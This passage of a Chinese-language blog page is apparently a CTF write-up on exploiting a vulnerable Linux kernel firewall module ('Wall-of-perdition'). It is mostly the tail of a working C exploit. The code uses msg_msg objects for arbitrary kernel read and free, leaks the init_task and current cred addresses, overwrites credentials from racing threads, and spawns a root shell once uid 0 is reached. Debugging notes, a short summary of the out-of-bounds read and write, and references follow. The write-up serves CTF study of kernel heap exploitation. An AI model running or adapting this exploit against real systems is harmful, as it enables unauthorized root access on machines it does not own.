</span><span style="color:#c0c5ce;">            queue = leak[i - </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">((leak[i] &amp; </span><span style="color:#d08770;">0xffff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x59a0 </span><span style="color:#c0c5ce;">&amp;&amp; !init_task)
</span><span style="color:#c0c5ce;">            init_task = leak[i] + </span><span style="color:#d08770;">0x1fcb20</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// sysfs_bin_kfops_ro
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(queue &amp;&amp; large_msg &amp;&amp; init_task)
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!queue || !large_msg || !init_task)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[X] Leak failed, try again!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">delete_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, OUTBOUND);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msgctl</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], IPC_RMID, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Queue found: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, queue);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] 4k message found: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, large_msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] sysfs_bin_kfops_ro found, init_task: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, init_task);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Locating current task address...</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    uint64_t current_task = </span><span style="color:#8fa1b3;">find_current_task</span><span style="color:#c0c5ce;">(init_task);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Leaked current task address: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, current_task);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 0x1fa*8=0xfd0
</span><span style="color:#c0c5ce;">    leak = </span><span style="color:#8fa1b3;">arb_read</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, current_task, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + </span><span style="color:#d08770;">0x1fa</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    cred_struct = leak[</span><span style="color:#d08770;">0x540</span><span style="color:#c0c5ce;">/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Leaked current task cred struct: 0x</span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, cred_struct);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task uid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task gid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">getgid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task euid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">geteuid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*memdump = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], memdump, </span><span style="color:#d08770;">0x1ff8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], memdump, </span><span style="color:#d08770;">0x1ff8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_NOERROR);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;tid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, allocate_msg1, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">sleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">arb_free</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, large_msg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;tid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, allocate_msg2, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_join</span><span style="color:#c0c5ce;">(tid[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_join</span><span style="color:#c0c5ce;">(tid[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task uid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task gid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">getgid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Current task euid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">geteuid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">())
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] We are root!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<h1 id="misc">Misc</h1><ul>
<li>编译带调试符号的内核</li>
</ul>
<p>使用ubuntu16编译，将<code>kernel.config</code>直接复制为<code>.config</code>，然后<code>make menuconfig</code>一次直接退出即可（原配置即有debug info），这一步意义是自动修改config头相关信息为本机配置。然后<code>make</code>即可</p>
<p>使用ubuntu20编译出现<code>yy_flex_debug</code>符号相关报错，无法解决</p>
<ul>
<li>ubuntu16 gdb手动升级</li>
</ul>
<p>调试发现报错<code>remote ‘g’ packet reply is too long</code>，且设置architecture后仍存在，且ubuntu20没有这个问题，猜测gdb版本原因，直接手动升级为10.2</p>
<p>参考：https://blog.csdn.net/qq_39153421/article/details/116753735</p>
<ul>
<li>奇怪的卡顿</li>
</ul>
<p>一开始想直接打一发exp发现卡在中间不动，后发现是因为开了编译优化<code>-O3</code>导致。由于两个缺页异常的恢复需要确定先后，故使用一个全局变量进行判断，若为0则持续while循环，等待前序操作完成。然而编译优化后直接让此处成为死循环，故卡死。去掉优化即可</p>
<h1 id="zong-jie">总结</h1><ul>
<li>越界读</li>
</ul>
<p>修改<code>m_ts</code></p>
<ul>
<li>越界写</li>
</ul>
<p>需要触发缺页异常，每次<code>msgsnd()</code>会新alloc内存并做写操作，msg不能复用。核心逻辑是在<code>kmalloc()</code>之后，<code>copy_from_user()</code>之前将<code>next</code>修改掉</p>
<h1 id="reference">Reference</h1><ul>
<li><a href="https://bbs.kanxue.com/thread-269311.htm#msg_header_h1_0">[原创]从两道0解题看Linux内核堆上msg_msg对象扩展利用</a></li>
<li><a href="https://www.anquanke.com/post/id/252558">Linux内核中利用msg_msg结构实现任意地址读写</a></li>
<li><a href="https://infosecwriteups.com/linux-kernel-communication-part-1-netfilter-hooks-15c07a5a5c4e">Linux Kernel Communication — Netfilter Hooks</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/msgop.2.html">msgsnd manpage</a></li>
</ul>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#netfilter-hooks">Netfilter Hooks</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#using-netfilter-hooks-inside-the-kernel">Using Netfilter Hooks inside the kernel</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#code-example">Code example</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#bu-chong-sk-buff">补充 sk_buff</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#nei-he-ipc-internet-process-connection">内核IPC(Internet Process Connection)</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#msg-msgdui-xiang">msg_msg对象</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#msgsnd">msgsnd</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#msgsnd-shu-ju-fa-song">msgsnd()数据发送</a></li><li class="toc-item toc-h4" data-level="4" style="margin-left:12px"><a href="#chuang-jian-xiao-xi">创建消息</a></li><li class="toc-item toc-h4" data-level="4" style="margin-left:12px"><a href="#kao-bei-xiao-xi">拷贝消息</a></li><li class="toc-item toc-h4" data-level="4" style="margin-left:12px"><a href="#nei-he-xiao-xi-jie-gou">内核消息结构</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#msgrcv">msgrcv</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#msgrcv-shu-ju-jie-shou">msgrcv()数据接收</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#xiao-xi-kao-bei">消息拷贝</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#xiao-xi-shi-fang">消息释放</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#shm-file-data">shm_file_data</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shmget">shmget</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shmat">shmat</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shmdt">shmdt</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shmctl">shmctl</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#shi-li">示例</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#shmdata-h">shmdata.h</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#shmread-c">shmread.c</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#shmwrite-c">shmwrite.c</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#an-quan-xing">安全性</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#init-task">init_task</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#userfaultfd">userfaultfd</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#fire-of-salvation">fire-of-salvation</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#user-rule-t-rule-t">user_rule_t && rule_t</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#init-firewall">init_firewall</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#firewall-inbound-hook-firewall-outbound-hook">firewall_inbound_hook && firewall_outbound_hook</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#process-rule">process_rule</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#firewall-ioctl">firewall_ioctl</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#firewall-add-rule">firewall_add_rule</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#firewall-delete-rule">firewall_delete_rule</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#firewall-edit-rule">firewall_edit_rule</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#firewall-show-rule">firewall_show_rule</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#firewall-dup-rule">firewall_dup_rule</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#lou-dong-li-yong">漏洞利用</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#xie-lu-nei-he-ji-zhi">泄露内核基址</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#xie-lu-creddi-zhi">泄露cred地址</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#cuan-gai-cred-real-credzhi-zhen">篡改cred & real_cred指针</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#wall-of-perdition">Wall-of-perdition</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#difference">Difference</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#lou-dong-li-yong">漏洞利用</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#yue-jie-du-xie-lu-nei-he-ji-zhi">越界读泄露内核基址</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#cong-yue-jie-du-dao-ren-yi-du">从越界读到任意读</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#ren-yi-di-zhi-shi-fang">任意地址释放</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#cong-ren-yi-di-zhi-shi-fang-dao-ren-yi-di-zhi-xie">从任意地址释放到任意地址写</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#misc">Misc</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#zong-jie">总结</a></li><li class="toc-item toc-h1" data-level="1" style="margin-left:12px"><a href="#reference">Reference</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="/script.js"></script>
</body>
</html>